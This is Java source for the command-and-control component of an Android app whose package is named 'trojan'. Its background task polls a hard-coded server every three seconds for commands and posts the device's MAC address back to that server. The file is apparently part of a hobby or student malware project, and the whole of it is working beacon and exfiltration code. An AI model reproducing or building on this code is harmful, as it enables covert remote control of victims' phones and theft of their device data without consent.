package trojan.android.android_trojan.AsyncTask;

import android.content.Context;
import android.os.AsyncTask;
import android.util.Log;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

import trojan.android.android_trojan.ActionService;
import trojan.android.android_trojan.Tools;

/**
 * Created by hoodlums on 14/01/15.
 */
public class ConnectionServerTask extends AsyncTask<Void, Void, Void> {
    private static final String TAG = "ConnectionServerTask";
    private HttpClient httpClient;
    private ActionService actionService;
    private String address="10.10.160.37";
    private String port="8080";
    private Context context;
    private int time = 3000;

    public ConnectionServerTask(Context context){
        this.context = context;
    }

    @Override
    protected void onPreExecute() {
        super.onPreExecute();
        Log.d(TAG, "onPreExecute");

        actionService = new ActionService();
        httpClient = new DefaultHttpClient();
    }

    @Override
    protected Void doInBackground(Void... voids) {
        InputStream inputStream = null;
        String result;

        while (!isCancelled()){
            Log.i(TAG, "doInBackground");
            try {
                HttpResponse httpResponse = httpClient.execute(new HttpGet("http://"+address+":"+port+"/action"));
                inputStream = httpResponse.getEntity().getContent();
                result = convertInputStreamToString(inputStream);
                Log.d(TAG, result);

                if(!result.equals("null") && inputStream != null){
                    HttpPost httppost = new HttpPost("http://"+address+":"+port+"/result");

                    List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(1);
                    nameValuePairs.add(new BasicNameValuePair("result", actionService.getMacAddress(context)));
                    httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));

                    HttpResponse response = httpClient.execute(httppost);
                }else {
                    result = "Did not work!";
                }
            } catch (Exception e) {
                Log.d(TAG, e.getLocalizedMessage());
            }

            Tools.sleep(time);
        }

        return null;
    }

    @Override
    protected void onPostExecute(Void aVoid) {
        super.onPostExecute(aVoid);
        Log.d(TAG, "onPostExecute");
    }

    private static String convertInputStreamToString(InputStream inputStream) throws IOException {
        BufferedReader bufferedReader = new BufferedReader( new InputStreamReader(inputStream));
        String line = "";
        String result = "";
        while((line = bufferedReader.readLine()) != null)
            result += line;

        inputStream.close();
        return result;

    }
}
